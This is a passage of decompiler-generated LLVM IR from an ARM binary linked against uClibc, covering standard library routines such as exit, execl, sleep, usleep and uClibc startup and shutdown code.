  %v0_1676c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1676c

dec_label_pc_1676c:                               ; preds = %bb70, %bb67, %dec_label_pc_1675c
  %v0_16774.pre = phi i32 [ %v0_16774.pre.pre, %bb70 ], [ %v0_16768, %dec_label_pc_1675c ], [ %v0_16774.pre.pre, %bb67 ]
  %v0_1676c = phi i32 [ %v0_16744, %bb70 ], [ %v0_1676c.pre, %dec_label_pc_1675c ], [ %v0_16744, %bb67 ]
  %v2_1676c = icmp eq i32 %v0_1676c, 0
  br i1 %v2_1676c, label %dec_label_pc_1676c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_1676c
  %v2_16770 = sub i32 0, %v0_16774.pre
  store i32 %v2_16770, i32* @ip, align 4
  br label %dec_label_pc_1676c._crit_edge

dec_label_pc_1676c._crit_edge:                    ; preds = %dec_label_pc_1676c, %bb71
  %v0_16774 = phi i32 [ %v2_16770, %bb71 ], [ %v0_16774.pre, %dec_label_pc_1676c ]
  %v2_16778 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16778, i32* @r4, align 4
  ret i32 %v0_16774

; uselistorder directives
  uselistorder i32 %v0_16774.pre, { 1, 0 }
  uselistorder i32 %v0_16774.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_16714, { 1, 0 }
  uselistorder i1 %v3_1670c, { 1, 0 }
  uselistorder i32 %v1_1670c, { 1, 0 }
  uselistorder i32 %v1_166f4, { 1, 0 }
  uselistorder i32 %v1_166d0, { 1, 0 }
  uselistorder i32 %v0_166c4, { 1, 0 }
  uselistorder i32 %v0_16698, { 1, 0, 2 }
  uselistorder i32 %v3_16678, { 1, 0 }
  uselistorder i32 %v1_1666c, { 1, 0, 2 }
  uselistorder i32 %v0_16660, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_16600, { 1, 0, 2 }
  uselistorder i32 %v0_165f8, { 1, 0, 2 }
  uselistorder i32 %v0_165f0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1676c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1676c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_1673c, { 1, 0 }
  uselistorder label %dec_label_pc_16724, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_166c8, { 1, 0 }
  uselistorder label %dec_label_pc_166c4, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16640, { 1, 0 }
  uselistorder label %dec_label_pc_1663c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_16780 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_16780, i32* @r0, align 4
  %v1_1679c = call i32 @__pthread_return_void()
  %v1_167ac = call i32 @__pthread_return_0()
  %v2_167b4 = load i32, i32* @global_var_2c804.1040, align 4
  %v2_167b8 = icmp eq i32 %v2_167b4, 0
  br i1 %v2_167b8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_167b4)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_16780, i32* @r0, align 4
  %v1_167d8 = call i32 @__pthread_return_void()
  store i32 %v1_167d8, i32* @r0, align 4
  %v1_167dc = call i32 @__GI___uClibc_fini(i32 %v1_167d8)
  store i32 92144, i32* @lr, align 4
  %v2_167ec = call i32 @_stdio_term()
  %v0_167f0 = load i32, i32* @r4, align 4
  %v1_167f4 = call i32 @__GI__exit(i32 %v0_167f0)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 4, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 2, 3, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_16814 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_16814, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_16824 = ptrtoint i32* %stack_var_-32 to i32
  %v2_16828 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_16828, i32* %stack_var_-32, align 4
  br label %dec_label_pc_16834

dec_label_pc_16834:                               ; preds = %dec_label_pc_16834, %entry
  %v0_16848 = phi i32 [ %v1_16848, %dec_label_pc_16834 ], [ 0, %entry ]
  %v3_16834 = phi i32 [ %v1_1683c, %dec_label_pc_16834 ], [ %v2_16828, %entry ]
  %v1_16838 = inttoptr i32 %v3_16834 to i32*
  %v2_16838 = load i32, i32* %v1_16838, align 4
  %v1_1683c = add i32 %v3_16834, 4
  %v2_16840 = icmp eq i32 %v2_16838, 0
  store i32 %v1_1683c, i32* %stack_var_-32, align 4
  %v1_16848 = add i32 %v0_16848, 1
  store i32 %v1_16848, i32* @lr, align 4
  br i1 %v2_16840, label %dec_label_pc_16850, label %dec_label_pc_16834

dec_label_pc_16850:                               ; preds = %dec_label_pc_16834
  %v3_16850.neg = mul i32 %v1_16848, -4
  %v1_16854.neg = add i32 %v2_16824, -8
  %v2_16858 = add i32 %v1_16854.neg, %v3_16850.neg
  %v2_16860 = inttoptr i32 %v2_16858 to i32*
  store i32 %arg1, i32* %v2_16860, align 4
  store i32 %v2_16828, i32* %stack_var_-32, align 4
  %v0_1686c = load i32, i32* @sp, align 4
  store i32 %v0_1686c, i32* @r1, align 4
  store i32 %v0_1686c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16874

dec_label_pc_16874:                               ; preds = %dec_label_pc_16874.dec_label_pc_16874_crit_edge, %dec_label_pc_16850
  %v1_16888 = phi i32 [ %v5_16888, %dec_label_pc_16874.dec_label_pc_16874_crit_edge ], [ %v0_1686c, %dec_label_pc_16850 ]
  %v3_16874 = phi i32 [ %v3_16874.pre, %dec_label_pc_16874.dec_label_pc_16874_crit_edge ], [ %v2_16828, %dec_label_pc_16850 ]
  %v1_16878 = inttoptr i32 %v3_16874 to i32*
  %v2_16878 = load i32, i32* %v1_16878, align 4
  %v0_1687c = load i32, i32* @lr, align 4
  %v1_1687c = add i32 %v0_1687c, -1
  store i32 %v1_1687c, i32* @lr, align 4
  %v7_1687c = icmp eq i32 %v0_1687c, 1
  %v1_16880 = add i32 %v3_16874, 4
  store i32 %v1_16880, i32* %stack_var_-32, align 4
  %v2_16888 = add i32 %v1_16888, 4
  %v3_16888 = inttoptr i32 %v2_16888 to i32*
  store i32 %v2_16878, i32* %v3_16888, align 4
  %v4_16888 = load i32, i32* %ip.global-to-local, align 4
  %v5_16888 = add i32 %v4_16888, 4
  store i32 %v5_16888, i32* %ip.global-to-local, align 4
  br i1 %v7_1687c, label %dec_label_pc_16890, label %dec_label_pc_16874.dec_label_pc_16874_crit_edge

dec_label_pc_16874.dec_label_pc_16874_crit_edge:  ; preds = %dec_label_pc_16874
  %v3_16874.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_16874

dec_label_pc_16890:                               ; preds = %dec_label_pc_16874
  %v2_16894 = load i32, i32* @global_var_2c80c.1045, align 4
  store i32 %v2_16894, i32* @r2, align 4
  %v0_16898 = call i32 @__GI_execve()
  ret i32 %v0_16898

; uselistorder directives
  uselistorder i32 %v5_16888, { 1, 0 }
  uselistorder i32 %v0_1687c, { 1, 0 }
  uselistorder i32 %v1_16848, { 0, 2, 1 }
  uselistorder i32 %v1_1683c, { 1, 0 }
  uselistorder i32 %v3_16834, { 1, 0 }
  uselistorder i32 %v2_16828, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_168a8 = load i32, i32* @r4, align 4
  store i32 %v3_168a8, i32* %stack_var_-20, align 4
  %v6_168a8 = load i32, i32* @r5, align 4
  %v9_168a8 = load i32, i32* @r6, align 4
  %v16_168a8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_168ac = icmp eq i32 %arg1, 0
  %v2_168b0 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_168ac, label %dec_label_pc_16a34, label %dec_label_pc_168c8.preheader

dec_label_pc_168c8.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_168d017 = add i32 %v16_168a8, 124
  br label %dec_label_pc_168c0

dec_label_pc_168c0:                               ; preds = %dec_label_pc_168c8.preheader, %dec_label_pc_168c0
  %v5_168d018 = phi i32 [ %v5_168d017, %dec_label_pc_168c8.preheader ], [ %v5_168d0, %dec_label_pc_168c0 ]
  %v2_168c4 = add i32 %v5_168d018, -136
  %v3_168c4 = inttoptr i32 %v2_168c4 to i32*
  store i32 0, i32* %v3_168c4, align 4
  %v0_168c8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_168c8 = add i32 %v0_168c8.pre, -1
  store i32 %v1_168c8, i32* %r1.global-to-local, align 4
  %v6_168c8 = icmp slt i32 %v1_168c8, 0
  %v4_168d0 = mul i32 %v1_168c8, 4
  %v5_168d0 = add i32 %v4_168d0, %v16_168a8
  br i1 %v6_168c8, label %dec_label_pc_168d8, label %dec_label_pc_168c0

dec_label_pc_168d8:                               ; preds = %dec_label_pc_168c0
  %v2_168d8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_168d8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_168e8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_168e8, i32* %stack_var_-28, align 4
  %v0_168f0 = call i32 @__sigaddset()
  store i32 %v0_168f0, i32* %r0.global-to-local, align 4
  %v1_168f4 = load i32, i32* @r5, align 4
  %v5_168f8 = icmp slt i32 %v0_168f0, %v1_168f4
  br i1 %v5_168f8, label %dec_label_pc_16a3c, label %dec_label_pc_168fc

dec_label_pc_168fc:                               ; preds = %dec_label_pc_168d8
  %v2_168fc = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_168fc, i32* @r4, align 4
  store i32 %v1_168f4, i32* %r0.global-to-local, align 4
  store i32 %v2_168d8, i32* %r1.global-to-local, align 4
  %v3_1690c = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_1690c = call i32 @__GI_sigprocmask(i32 %v1_168f4, %_TYPEDEF_sigset_t* %v3_1690c, i32 %v2_168fc)
  store i32 %v4_1690c, i32* %r0.global-to-local, align 4
  %v1_16910 = load i32, i32* @r5, align 4
  %v9_16910 = icmp eq i32 %v4_1690c, %v1_16910
  br i1 %v9_16910, label %dec_label_pc_16918, label %dec_label_pc_16a3c

dec_label_pc_16918:                               ; preds = %dec_label_pc_168fc
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_168fc, i32* %r0.global-to-local, align 4
  %v2_16920 = call i32 @__sigismember(i32 %v2_168fc, i32 17)
  store i32 %v2_16920, i32* %r0.global-to-local, align 4
  %v1_16924 = load i32, i32* @r5, align 4
  %v9_16924 = icmp eq i32 %v2_16920, %v1_16924
  br i1 %v9_16924, label %dec_label_pc_1693c.preheader, label %dec_label_pc_16918.dec_label_pc_16a04_crit_edge

dec_label_pc_16918.dec_label_pc_16a04_crit_edge:  ; preds = %dec_label_pc_16918
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_16a04

dec_label_pc_1693c.preheader:                     ; preds = %dec_label_pc_16918
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16934

dec_label_pc_16934:                               ; preds = %dec_label_pc_1693c.preheader, %dec_label_pc_16934
  %v5_1694416 = phi i32 [ %v5_168d017, %dec_label_pc_1693c.preheader ], [ %v5_16944, %dec_label_pc_16934 ]
  %v2_16938 = add i32 %v5_1694416, -136
  %v3_16938 = inttoptr i32 %v2_16938 to i32*
  store i32 0, i32* %v3_16938, align 4
  %v0_1693c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1693c = add i32 %v0_1693c.pre, -1
  store i32 %v1_1693c, i32* %r1.global-to-local, align 4
  %v6_1693c = icmp slt i32 %v1_1693c, 0
  %v4_16944 = mul i32 %v1_1693c, 4
  %v5_16944 = add i32 %v4_16944, %v16_168a8
  br i1 %v6_1693c, label %dec_label_pc_1694c, label %dec_label_pc_16934

dec_label_pc_1694c:                               ; preds = %dec_label_pc_16934
  store i32 %v2_168d8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_16954 = call i32 @__sigaddset()
  store i32 %v0_16954, i32* %r0.global-to-local, align 4
  %v1_16958 = icmp slt i32 %v0_16954, 0
  br i1 %v1_16958, label %dec_label_pc_16a3c, label %dec_label_pc_16960

dec_label_pc_16960:                               ; preds = %dec_label_pc_1694c
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_1696c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_168b0)
  store i32 %v4_1696c, i32* %r0.global-to-local, align 4
  %v1_16970 = icmp slt i32 %v4_1696c, 0
  br i1 %v1_16970, label %dec_label_pc_16978, label %dec_label_pc_169a0

dec_label_pc_16978:                               ; preds = %dec_label_pc_16960
  %v0_16978 = call i32 @__errno_location()
  store i32 %v2_168fc, i32* %r1.global-to-local, align 4
  store i32 %v0_16978, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1698c = inttoptr i32 %v0_16978 to i32*
  %v2_1698c = load i32, i32* %v1_1698c, align 4
  store i32 %v2_1698c, i32* @r4, align 4
  %v3_16990 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_16990 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_16990, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_16998 = load i32, i32* @r4, align 4
  %v1_16998 = load i32, i32* %r5.global-to-local, align 4
  %v2_16998 = inttoptr i32 %v1_16998 to i32*
  store i32 %v0_16998, i32* %v2_16998, align 4
  %v17_16a44.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a40

dec_label_pc_169a0:                               ; preds = %dec_label_pc_16960
  %v2_169a0 = load i32, i32* %stack_var_-424, align 4
  %v7_169a4 = icmp eq i32 %v2_169a0, 1
  %v2_169ac = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_169ac, i32* @r4, align 4
  br i1 %v7_169a4, label %dec_label_pc_169b4, label %dec_label_pc_169e8

dec_label_pc_169b4:                               ; preds = %dec_label_pc_169a0
  store i32 %v2_169ac, i32* %r1.global-to-local, align 4
  store i32 %v2_169ac, i32* %r0.global-to-local, align 4
  %v2_169bc = bitcast i32* %stack_var_-28 to %timespec*
  %v3_169bc = call i32 @__libc_nanosleep(%timespec* %v2_169bc, i32 %v2_169ac)
  store i32 %v3_169bc, i32* %r0.global-to-local, align 4
  store i32 %v3_169bc, i32* %r6.global-to-local, align 4
  %v0_169c4 = call i32 @__errno_location()
  store i32 %v2_168fc, i32* %r1.global-to-local, align 4
  store i32 %v0_169c4, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_169d8 = inttoptr i32 %v0_169c4 to i32*
  %v2_169d8 = load i32, i32* %v1_169d8, align 4
  store i32 %v2_169d8, i32* @r4, align 4
  %v3_169dc = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_169dc = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_169dc, i32 0)
  store i32 %v4_169dc, i32* %r0.global-to-local, align 4
  %v0_169e0 = load i32, i32* @r4, align 4
  %v1_169e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_169e0 = inttoptr i32 %v1_169e0 to i32*
  store i32 %v0_169e0, i32* %v2_169e0, align 4
  %v0_16a10.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16a10

dec_label_pc_169e8:                               ; preds = %dec_label_pc_169a0
  store i32 %v2_168fc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_169f4 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_169f4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_169f4, i32 0)
  store i32 %v4_169f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a04

dec_label_pc_16a04:                               ; preds = %dec_label_pc_16918.dec_label_pc_16a04_crit_edge, %dec_label_pc_169e8
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_16918.dec_label_pc_16a04_crit_edge ], [ %v2_169ac, %dec_label_pc_169e8 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_16a08 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_16a08 = call i32 @__libc_nanosleep(%timespec* %v2_16a08, i32 %storemerge.pre-phi)
  store i32 %v3_16a08, i32* %r0.global-to-local, align 4
  store i32 %v3_16a08, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16a10

dec_label_pc_16a10:                               ; preds = %dec_label_pc_169b4, %dec_label_pc_16a04
  %v0_16a10 = phi i32 [ %v0_16a10.pr, %dec_label_pc_169b4 ], [ %v3_16a08, %dec_label_pc_16a04 ]
  %v2_16a10 = icmp eq i32 %v0_16a10, 0
  br i1 %v2_16a10, label %dec_label_pc_16a34, label %dec_label_pc_16a18

dec_label_pc_16a18:                               ; preds = %dec_label_pc_16a10
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_16a20 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_16a20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a40

dec_label_pc_16a34:                               ; preds = %entry, %dec_label_pc_16a10
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a40

dec_label_pc_16a3c:                               ; preds = %dec_label_pc_168fc, %dec_label_pc_1694c, %dec_label_pc_168d8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a40

dec_label_pc_16a40:                               ; preds = %dec_label_pc_16a18, %dec_label_pc_16a34, %dec_label_pc_16978, %dec_label_pc_16a3c
  %v17_16a44 = phi i32 [ %v3_16a20, %dec_label_pc_16a18 ], [ 0, %dec_label_pc_16a34 ], [ %v17_16a44.pre, %dec_label_pc_16978 ], [ -1, %dec_label_pc_16a3c ]
  %v2_16a44 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16a44, i32* @r4, align 4
  store i32 %v6_168a8, i32* @r5, align 4
  store i32 %v9_168a8, i32* @r6, align 4
  ret i32 %v17_16a44

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_169ac, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_1693c, { 0, 2, 1 }
  uselistorder i32 %v2_168fc, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_168f4, { 1, 0, 2 }
  uselistorder i32 %v1_168c8, { 0, 2, 1 }
  uselistorder i32 %v16_168a8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16a40, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16a3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16a34, { 1, 0 }
  uselistorder label %dec_label_pc_16a10, { 1, 0 }
  uselistorder label %dec_label_pc_16a04, { 1, 0 }
  uselistorder label %dec_label_pc_16934, { 1, 0 }
  uselistorder label %dec_label_pc_168c0, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_16a4c = load i32, i32* @r4, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_16a60 = udiv i32 %arg1, 1000000
  store i32 %v2_16a60, i32* %stack_var_-20, align 4
  %v2_16a88 = bitcast i32* %stack_var_-20 to %timespec*
  %v3_16a88 = call i32 @__libc_nanosleep(%timespec* %v2_16a88, i32 0)
  store i32 %v3_16a4c, i32* @r4, align 4
  ret i32 %v3_16a88

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_16ac4:
  %stack_var_-8 = alloca i32, align 4
  %v3_16a98 = load i32, i32* @r4, align 4
  store i32 %v3_16a98, i32* %stack_var_-8, align 4
  %v2_16ac8 = load i32, i32* @global_var_2c814.1052, align 4
  %v2_16acc = icmp eq i32 %v2_16ac8, 0
  br i1 %v2_16acc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16ac4
  call void @__pseudo_branch(i32 %v2_16ac8)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16ac4, %bb
  %v2_16adc = load i32, i32* @global_var_2c818.1054, align 4
  %v2_16ae0 = icmp eq i32 %v2_16adc, 0
  br i1 %v2_16ae0, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_16ae4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_16ae4, i32* @r4, align 4
  %v9_16ae4 = load i32, i32* @r0, align 4
  ret i32 %v9_16ae4

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_16adc)
  %v2_16af0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16af0, i32* @r4, align 4
  %v8_16af0 = load i32, i32* @r0, align 4
  ret i32 %v8_16af0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_16b0c = load i32, i32* @r0, align 4
  ret i32 %v1_16b0c
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16b10 = load i32, i32* @r4, align 4
  store i32 %v3_16b10, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_16b20 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_16b24 = icmp eq i32 %v2_16b20, -1
  br i1 %v7_16b24, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_16b28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_16b28, i32* @r4, align 4
  ret i32 %v2_16b20

bb4:                                              ; preds = %entry
  %v0_16b2c = load i32, i32* @r4, align 4
  %v4_16b34 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1d8a4.1057, i32 0, i32 0), i32 %v0_16b2c)
  %v1_16b38 = load i32, i32* %r5.global-to-local, align 4
  %v9_16b38 = icmp eq i32 %v4_16b34, %v1_16b38
  br i1 %v9_16b38, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_16b3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_16b3c, i32* @r4, align 4
  ret i32 %v4_16b34

bb6:                                              ; preds = %bb4
  %v0_16b40 = call i32 @abort()
  %v0_16b44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16b44, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_16b40

; uselistorder directives
  uselistorder i32 %v2_16b20, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_16b4c = load i32, i32* @global_var_2c81c.1059, align 4
  %v2_16b50 = icmp eq i32 %v2_16b4c, 0
  br i1 %v2_16b50, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_16b5c = load i32, i32* @r0, align 4
  ret i32 %v6_16b5c

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_2c81c.1059, align 4
  store i32 4096, i32* @global_var_2c810.813, align 4
  %v0_16b90 = call i32 @_stdio_init()
  ret i32 %v0_16b90
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_16ba8 = mul i32 %arg2, 4
  %v5_16ba8 = add i32 %tmp, %v4_16ba8
  %v2_16bac = load i32, i32* %arg3, align 4
  %v2_16bb0 = ptrtoint i32* %stack_var_-120 to i32
  %v1_16bb4 = add i32 %v5_16ba8, 4
  %v9_16bb8 = icmp eq i32 %v1_16bb4, %v2_16bac
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_2c808.1065, align 4
  store i32 %v1_16bb4, i32* @global_var_2c80c.1045, align 4
  store i32 %arg6, i32* @global_var_2c818.1054, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_16bb8, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_16ba8, i32* @global_var_2c80c.1045, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_16bf8 = bitcast i32* %stack_var_-120 to i8*
  %v3_16bf8 = call i32 @__GI_memset(i8* %v2_16bf8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_2c80c.1045, align 4
  br label %dec_label_pc_16c08

dec_label_pc_16c08:                               ; preds = %dec_label_pc_16c08, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_16c08, %dec_label_pc_16c08 ]
  %v1_16c08 = inttoptr i32 %storemerge to i32*
  %v2_16c08 = load i32, i32* %v1_16c08, align 4
  %v4_16c08 = add i32 %storemerge, 4
  %v2_16c0c = icmp eq i32 %v2_16c08, 0
  br i1 %v2_16c0c, label %dec_label_pc_16c18, label %dec_label_pc_16c08

dec_label_pc_16c18:                               ; preds = %dec_label_pc_16c08
  store i32 %v4_16c08, i32* @r4, align 4
  %v1_16c3822 = inttoptr i32 %v4_16c08 to i32*
  %v2_16c3823 = load i32, i32* %v1_16c3822, align 4
  %v2_16c3c25 = icmp eq i32 %v2_16c3823, 0
  br i1 %v2_16c3c25, label %dec_label_pc_16c44, label %dec_label_pc_16c20

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16c18, %dec_label_pc_16c38
  %v5_16c24 = phi i32 [ %v2_16c38, %dec_label_pc_16c38 ], [ %v2_16c3823, %dec_label_pc_16c18 ]
  %v2_16c20 = icmp ugt i32 %v5_16c24, 13
  %v7_16c20 = icmp eq i32 %v5_16c24, 14
  %v2_16c24 = xor i1 %v2_16c20, true
  %v3_16c24 = or i1 %v7_16c20, %v2_16c24
  br i1 %v3_16c24, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_16c20
  %v6_16c24 = and i32 %v5_16c24, 536870912
  %v7_16c24 = icmp ne i32 %v6_16c24, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_16c20, %bb42
  %v1_16c30 = phi i1 [ %v2_16c20, %dec_label_pc_16c20 ], [ %v7_16c24, %bb42 ]
  %v2_16c28 = xor i1 %v1_16c30, true
  %v3_16c28 = or i1 %v7_16c20, %v2_16c28
